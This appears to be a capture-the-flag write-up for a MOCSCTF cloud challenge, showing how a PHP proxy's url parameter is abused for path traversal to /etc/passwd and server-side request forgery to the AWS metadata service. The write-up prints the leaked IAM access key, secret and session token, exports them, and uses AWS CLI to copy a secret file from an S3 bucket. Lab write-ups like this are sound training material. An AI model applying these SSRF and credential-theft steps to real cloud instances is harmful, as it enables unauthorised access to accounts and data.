# Writeup
Description:
Do you know who iam? Find me on the cloud.
Never Gonna Give You Up!
http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=noflag.txt

Solution:
1. This is a PHP page require a parameter url.

http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=

2. You can either redirect to google.com or view local file.

http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://google.com

http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=../../../../etc/passwd

3. As you know, this is aws EC2 instance. The main point is to abuse AWS Metadata Service.

http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

4. You can discover the IAM **mocsctf-role** from Metadata. The IAM metadata contains AccessKeyId, SecretAccessKey, Token.

http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/mocsctf-role

```
{ "Code" : "Success", "LastUpdated" : "2022-02-04T07:33:43Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIATY2C4XDICN77NGPZ", "SecretAccessKey" : "HXZkUSeQN+rHsEkmaxPNhfBzc0CKxoiQfAcgqi7h", "Token" : "IQoJb3JpZ2luX2VjEFAaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAMpBSbIvl4raiHKLcsZrS4i5LExjgvZ4PwKuYL3vRHQAAiBAE6ntYyPEglSaKcldQbu8Ac0dZFsvL8HgbkV0Vp1cPyqNBAiJ//////////8BEAAaDDI1OTQ0ODk0NDg0OCIMIPRmSZH9dnh/EEkZKuED8+K8qJGroe31/sYeGmk2BaobGxSWn7UwWR4e8uMCKodk5+r2wQe3ipIC9lmsrNdjRZSfHruOpFS2QHEY0w4VGSTa/ehyGDwezXbpK3CdD7s3X6g3X6L60tp2/rGJJQayL4FcGN7StwXEuAH+NK0XhbN32Rrhze4IcKXVB2j00i6+f40oq01mP8N9o5cPezmNCyaPRfos7DBV6H1vJcKYgoCz7+WyCNHC/bLKxYg3Fim7RDjE6Y8ND4s3INu5ZUIW6+8mvlL9H2dy6/oFQPsSb58iREb0v/oD5bl5AA9rRsQoJSPd8ImwYfC19uF0MlHSkseHZJLpsuBohf9Rs6t6g6o3EBHy9tSIMyhwQwl3IfWPL7PaNdFR470ppiephjkK0ILilVmnZFMfXbz7eh/i34E7lS8gZdkXTxRmnLhQ0HQ6NF42Nse2GZdl6u3A8BibZ3YGQCMsZL2wzYSlCHbvHJkLU0t8KqRVIjaZ2dO7swQd0Y37h0bFSYZ3XhDpzVmkTY+kFWoDdq+yKWyOPGP60bp+mg0T/FXJn6uS0hy4nC8LZAi3NvKhco9gsgOnn3Dov2IjeA/SC/hClFsgN6pfYGSbKn2knN/4y+O6EBcZh1sG3RDnL3fLa+PHkLgySo7xcTCFrvOPBjqlAWtIh3oe1KHe2WPBB2s6jos2304sGf42l15IJ1BDJhFzm2WKi64bZW2Yu6xPSbqBtKwJEkwZG2eHef1uJnHUjDEMGYjzScgj5l62xYZXfLHMoyvgDwjT8V4dGxYC81utggRRpH2ureuRsr6uD5D/1NopTFuHVmm12UaMosu6FMCg2rEhnRt5BYvRer3j6MXBznz3nd3ouzPD5hs3jw/cLi8suNBQew==", "Expiration" : "2022-02-04T13:39:08Z" }
```

5. Configure AWS CLI with above leak AWS Access Key information. **The access key will be changed, please access the latest metadata**

```
export AWS_ACCESS_KEY_ID=[AWS_ACCESS_KEY_ID]
export AWS_DEFAULT_REGION=[AWS_DEFAULT_REGION] 
export AWS_SECRET_ACCESS_KEY=[AWS_SECRET_ACCESS_KEY]
export AWS_SESSION_TOKEN=[AWS_SESSION_TOKEN]
```

```
export AWS_ACCESS_KEY_ID=ASIATY2C4XDICN77NGPZ
export AWS_DEFAULT_REGION=ap-southeast-1
export AWS_SECRET_ACCESS_KEY=HXZkUSeQN+rHsEkmaxPNhfBzc0CKxoiQfAcgqi7h
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEFAaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAMpBSbIvl4raiHKLcsZrS4i5LExjgvZ4PwKuYL3vRHQAAiBAE6ntYyPEglSaKcldQbu8Ac0dZFsvL8HgbkV0Vp1cPyqNBAiJ//////////8BEAAaDDI1OTQ0ODk0NDg0OCIMIPRmSZH9dnh/EEkZKuED8+K8qJGroe31/sYeGmk2BaobGxSWn7UwWR4e8uMCKodk5+r2wQe3ipIC9lmsrNdjRZSfHruOpFS2QHEY0w4VGSTa/ehyGDwezXbpK3CdD7s3X6g3X6L60tp2/rGJJQayL4FcGN7StwXEuAH+NK0XhbN32Rrhze4IcKXVB2j00i6+f40oq01mP8N9o5cPezmNCyaPRfos7DBV6H1vJcKYgoCz7+WyCNHC/bLKxYg3Fim7RDjE6Y8ND4s3INu5ZUIW6+8mvlL9H2dy6/oFQPsSb58iREb0v/oD5bl5AA9rRsQoJSPd8ImwYfC19uF0MlHSkseHZJLpsuBohf9Rs6t6g6o3EBHy9tSIMyhwQwl3IfWPL7PaNdFR470ppiephjkK0ILilVmnZFMfXbz7eh/i34E7lS8gZdkXTxRmnLhQ0HQ6NF42Nse2GZdl6u3A8BibZ3YGQCMsZL2wzYSlCHbvHJkLU0t8KqRVIjaZ2dO7swQd0Y37h0bFSYZ3XhDpzVmkTY+kFWoDdq+yKWyOPGP60bp+mg0T/FXJn6uS0hy4nC8LZAi3NvKhco9gsgOnn3Dov2IjeA/SC/hClFsgN6pfYGSbKn2knN/4y+O6EBcZh1sG3RDnL3fLa+PHkLgySo7xcTCFrvOPBjqlAWtIh3oe1KHe2WPBB2s6jos2304sGf42l15IJ1BDJhFzm2WKi64bZW2Yu6xPSbqBtKwJEkwZG2eHef1uJnHUjDEMGYjzScgj5l62xYZXfLHMoyvgDwjT8V4dGxYC81utggRRpH2ureuRsr6uD5D/1NopTFuHVmm12UaMosu6FMCg2rEhnRt5BYvRer3j6MXBznz3nd3ouzPD5hs3jw/cLi8suNBQew==
```

6. we can explore the bucket using AWS CLI, then we discover **iam-ctf-bucket** and find out the flag.
```
aws s3 ls
aws s3 ls s3://iam-ctf-bucket
aws s3 cp s3://iam-ctf-bucket/secret.txt ./
cat secret.txt
```

## flag
MOCSCTF{1eak_AW3_s3cr3t_Acce55_KEY}